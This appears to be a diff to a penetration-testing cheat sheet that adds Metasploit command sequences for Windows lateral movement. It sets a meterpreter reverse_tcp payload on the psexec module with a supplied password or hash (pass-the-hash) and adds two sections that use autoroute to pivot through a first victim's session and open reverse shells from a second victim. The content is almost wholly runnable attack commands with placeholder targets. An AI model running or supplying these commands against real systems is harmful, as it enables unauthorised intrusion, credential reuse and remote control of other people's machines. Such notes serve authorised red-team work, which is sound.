@@ -629,6 +629,8 @@ use exploit/windows/smb/psexec
 set RHOSTS <Target Host>
 set SMBUser <Username>
 set SMBPass <Password> # SMBPass can be the clear text password or the password hash.  
+set PAYLOAD /windows/meterpreter/reverse_tcp
+set LHOST <Attack Host>
 exploit
 
 # Error STATUS_ACCESS_DENIED usually means user does not have access to administrative shares.
@@ -650,6 +652,40 @@ meterpreter > reg setval -k 'HKEY_LOCAL_MACHINE\System\CurrentControlSet\Service
 ```
 ###### [PSExec Pass the Hash](https://www.offensive-security.com/metasploit-unleashed/psexec-pass-hash/)
 ###### [Pass-the-Hash Is Dead: Long Live LocalAccountTokenFilterPolicy](https://blog.harmj0y.net/redteaming/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy/)
+
+##### Establish Reverse Shell from Second Victim with SMB
+```bash
+# Add route to Victim 2's subnet, pointing to Victim 1's session.
+use post/windows/manage/autoroute
+set SESSION <Victim 1's Session #>
+set SUBNET <Victim 2's Subnet>
+run
+
+use exploit/windows/smb/psexec
+set RHOSTS <Victim 2 Host>
+set SMBUser <Username>
+set SMBPass <Password> # SMBPass can be the clear text password or the password hash.  
+set PAYLOAD /windows/meterpreter/reverse_tcp
+set LHOST <Attack Host>
+exploit
+```
+##### Establish Reverse Shell from Second Victim with SMB using Proxy
+```bash
+# Add routes to both victims, pointing to Victim 1's session.
+use post/windows/manage/autoroute
+set SESSION <Victim 1's Session #>
+set SUBNET <Victim 1's Subnet>
+set SUBNET <Victim 2's Subnet>
+run
+
+use exploit/windows/smb/psexec
+set RHOSTS <Victim 2 Host>
+set SMBUser <Username>
+set SMBPass <Password> # SMBPass can be the clear text password or the password hash.  
+set PAYLOAD /windows/meterpreter/reverse_tcp
+set LHOST <Victim 1 Host>
+exploit
+```
 
 ##### Capture SMB Hashes
 ```bash
